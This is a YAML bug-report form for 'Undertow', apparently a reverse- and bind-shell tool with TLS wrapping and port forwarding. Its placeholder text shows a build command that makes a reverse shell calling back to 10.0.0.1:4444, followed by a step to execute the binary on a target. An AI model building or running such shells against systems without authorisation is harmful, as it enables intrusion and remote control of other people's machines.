name: Bug Report
description: Report a bug in Undertow
title: "[Bug]: "
labels: ["bug"]
body:
  - type: markdown
    attributes:
      value: |
        Thank you for reporting a bug. Please fill out the information below to help us investigate.

  - type: dropdown
    id: component
    attributes:
      label: Component
      description: Which component is affected?
      options:
        - Reverse Shell
        - Bind Shell
        - SFTP
        - Port Forwarding
        - TLS Wrapping
        - Build Script
        - Handler Script
        - PTY / Shell
        - Other
    validations:
      required: true

  - type: dropdown
    id: platform
    attributes:
      label: Platform
      description: Which platform are you running on?
      options:
        - Linux x64
        - Linux x86
        - Windows x64
        - Windows x86
        - Other
    validations:
      required: true

  - type: textarea
    id: description
    attributes:
      label: Description
      description: A clear description of the bug
      placeholder: What happened? What did you expect to happen?
    validations:
      required: true

  - type: textarea
    id: reproduce
    attributes:
      label: Steps to Reproduce
      description: How can we reproduce this?
      placeholder: |
        1. Build with `./build.sh reverse 10.0.0.1:4444 --tls`
        2. Run the handler
        3. Execute the binary on target
        4. See error...
    validations:
      required: true

  - type: textarea
    id: build-command
    attributes:
      label: Build Command
      description: The exact build command used
      placeholder: ./build.sh reverse 10.0.0.1:4444 --tls --compress
    validations:
      required: false

  - type: input
    id: go-version
    attributes:
      label: Go Version
      description: Output of `go version`
      placeholder: go1.21.0 linux/amd64
    validations:
      required: false

  - type: textarea
    id: logs
    attributes:
      label: Logs / Error Output
      description: Any relevant log output or error messages
      render: shell
    validations:
      required: false
